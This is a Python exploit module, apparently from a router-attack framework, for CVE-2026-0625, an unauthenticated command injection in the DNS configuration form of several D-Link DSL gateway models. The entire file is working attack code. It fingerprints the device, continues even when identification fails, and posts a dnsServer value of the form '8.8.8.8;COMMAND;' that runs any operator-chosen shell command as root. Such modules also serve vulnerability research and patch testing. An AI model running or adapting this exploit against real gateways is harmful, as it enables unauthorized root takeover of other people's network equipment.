# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
"""CVE-2026-0625: D-Link DSL-2740R/2640B/2780B/526B DNS Config Command Injection.

Multiple D-Link DSL gateway models are vulnerable to command injection
through the DNS configuration interface. The ``dnsMode`` or ``dnsServer``
parameters in the WAN configuration form are passed to shell commands
without sanitization. This vulnerability is actively exploited in the wild.

CVSS v3.1: 9.3 (Critical)
Vector:    AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:H
"""
import socket

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

__all__ = ["Exploit"]


class Exploit(BaseExploit):
    """D-Link DSL series DNS configuration command injection,
    actively exploited in the wild (CVE-2026-0625)."""

    __info__ = {
        "name": "CVE-2026-0625: D-Link DSL DNS Config Command Injection",
        "description": (
            "Multiple D-Link DSL gateway models pass the dnsServer "
            "parameter from the WAN DNS configuration form to a shell "
            "command without sanitization. Unauthenticated command "
            "injection as root. Actively exploited in the wild."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike) | Uniao Geek",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-0625",
            "https://www.dlink.com/security-bulletin",
        ),
        "devices": (
            "D-Link DSL-2740R",
            "D-Link DSL-2640B",
            "D-Link DSL-2780B",
            "D-Link DSL-526B",
        ),
        "cve": "CVE-2026-0625",
        "cvss": "9.3",
        "severity": "CRITICAL",
        "mitre_techniques": ["T1059", "T1190"],
        "mitre_tactics": ["Initial Access", "Execution"],
    }

    target = OptIP("", "Target IPv4 address of the D-Link DSL gateway")
    port = OptPort(80, "HTTP port (default: 80)")
    timeout = OptFloat(8.0, "Connection timeout in seconds")
    command = OptString("id", "OS command to inject (PoC; default: id)")

    _DNS_FORM = "/dnscfg.cgi"

    @mute
    def check(self) -> bool:
        """Check if the target is a D-Link DSL gateway."""
        if HAS_REQUESTS:
            try:
                url = f"http://{self.target}:{self.port}/"
                resp = requests.get(url, timeout=self.timeout)
                body = resp.text.lower()
                return any(
                    model in body
                    for model in ("dsl-2740", "dsl-2640", "dsl-2780", "dsl-526")
                ) or "d-link" in body
            except Exception:
                pass
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            sock.sendall(
                f"GET / HTTP/1.0\r\nHost: {self.target}\r\n\r\n".encode()
            )
            data = sock.recv(4096).decode(errors="replace").lower()
            sock.close()
            return "dsl-2" in data or "d-link" in data
        except Exception:
            return False

    def run(self) -> None:
        if not self.target:
            print_error("Target IP is required")
            return

        if self.check():
            print_success(f"D-Link DSL gateway detected at {self.target}:{self.port}")
        else:
            print_warning("Device not positively identified; proceeding anyway")

        self._exploit()

    def _exploit(self) -> None:
        # Injection via dnsServer parameter: 8.8.8.8;COMMAND;
        injection = f"8.8.8.8;{self.command};"
        url = f"http://{self.target}:{self.port}{self._DNS_FORM}"
        data = {
            "dnsMode": "manual",
            "dnsServer": injection,
        }

        print_status(f"Sending DNS config command injection to {url}")
        print_info(f"Payload: dnsServer={injection}")
        print_warning("NOTE: This CVE is actively exploited in the wild")

        if HAS_REQUESTS:
            try:
                resp = requests.post(
                    url, data=data, timeout=self.timeout
                )
                print_info(f"HTTP {resp.status_code}")
                if resp.status_code == 200:
                    print_success(
                        "DNS configuration form submitted. If vulnerable, "
                        f"'{self.command}' executed as root."
                    )
                else:
                    print_warning(f"Unexpected status: {resp.status_code}")
            except Exception as exc:
                print_error(f"Request failed: {exc}")
        else:
            print_warning("requests library not installed; showing payload")
            print_info(f"POST {url}")
            print_info(f"Data: {data}")
